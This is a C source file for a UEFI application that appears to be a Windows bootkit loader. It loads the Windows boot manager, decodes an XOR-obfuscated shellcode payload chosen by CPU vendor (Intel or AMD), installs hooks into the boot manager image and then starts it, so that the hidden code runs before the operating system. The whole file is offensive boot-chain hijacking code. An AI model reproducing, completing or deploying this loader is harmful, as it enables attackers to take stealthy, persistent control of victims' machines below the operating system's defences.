#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/DevicePathLib.h>
#include "Utils.h"
#include "PeStructs.h"
#include "BootMgfw.h"
#include "Exploit.h"
#include "ExpShell.h"
#include <intrin.h>

const UINT32 _gUefiDriverRevision = 0x200;

UINT32 GetCPUVendor()
{
    CPUID data = { 0 };
    char vendor[0x20] = { 0 };
    __cpuid((int*)&data, 0);
    *(int*)(vendor) = data.ebx;
    *(int*)(vendor + 4) = data.edx;
    *(int*)(vendor + 8) = data.ecx;

    if (MemCmp(vendor, "GenuineIntel", 12) == 0)
        return 1;
    if (MemCmp(vendor, "AuthenticAMD", 12) == 0)
        return 2;

    return 0;
}

EFI_STATUS EFIAPI UefiUnload(EFI_HANDLE ImageHandle)
{
    return EFI_SUCCESS;
}

EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
{
    EFI_STATUS Status = EFI_DEVICE_ERROR;
    EFI_HANDLE BootMgfwHandle = NULL;
    EFI_DEVICE_PATH* BootMgfwPath = NULL;

    UINT32 Index = 0;
    if (EFI_ERROR((Status = RestoreBootMgfw(&Index))))
    {
        Print(L"ERORR: 0\n");
        gBS->Stall(SEC_TO_MS(5));
        return Status;
    }

    if (EFI_ERROR((Status = GetBootMgfwPath(/*Index,*/ &BootMgfwPath))))
    {
        Print(L"ERORR: 1\n");
        gBS->Stall(SEC_TO_MS(5));
        return Status;
    }

    //if (EFI_ERROR((Status = SetBootCurrentToWindowsBootmgr())))
    //{
    //    Print(L"ERORR: 2\n");
    //    gBS->Stall(SEC_TO_MS(5));
    //    return Status;
    //}
    //Print(L"Path -> %s\n", ConvertDevicePathToText(BootMgfwPath, FALSE, FALSE));
    //Print(L"Type -> 0x%X\n", BootMgfwPath->Type);
    //Print(L"SubType -> 0x%X\n", BootMgfwPath->SubType);
    if (EFI_ERROR((Status = gBS->LoadImage(TRUE, ImageHandle, BootMgfwPath, NULL, 0, &BootMgfwHandle))))
    {
        Print(L"ERORR3: %r\n", Status);
        gBS->Stall(SEC_TO_MS(5));
        return EFI_ABORTED;
    }

    UINT32 CupType = GetCPUVendor();
    if (CupType == 1)
    {
        for (UINT32 i = 0; i < sizeof(IntelShell); i++)
            IntelShell[i] = (UINT8)(IntelShell[i] ^ ((i + 7 * i + 8) + 4 + i));

        ExpLoad = (UINT8*)IntelShell;
    }     
    else if (CupType == 2)
    {
        for (UINT32 i = 0; i < sizeof(AmdShell); i++)
            AmdShell[i] = (UINT8)(AmdShell[i] ^ ((i + 7 * i + 8) + 4 + i));

        ExpLoad = (UINT8*)AmdShell;
    }
      
    //Print(L"CPU: %u -> %u\n", GetCPUVendor(), Index);

    if (EFI_ERROR((Status = InstallBootMgfwHooks(BootMgfwHandle))))
    {
        Print(L"ERORR: 4\n");
        gBS->Stall(SEC_TO_MS(5));
        return Status;
    }

    gBS->Stall(SEC_TO_MS(10));
    Status = gBS->StartImage(BootMgfwHandle, NULL, NULL);
    if (EFI_ERROR((Status)))
    {
        Print(L"ERORR: 5\n");
        gBS->Stall(SEC_TO_MS(5));
        return EFI_ABORTED;
    }
    return EFI_SUCCESS;
}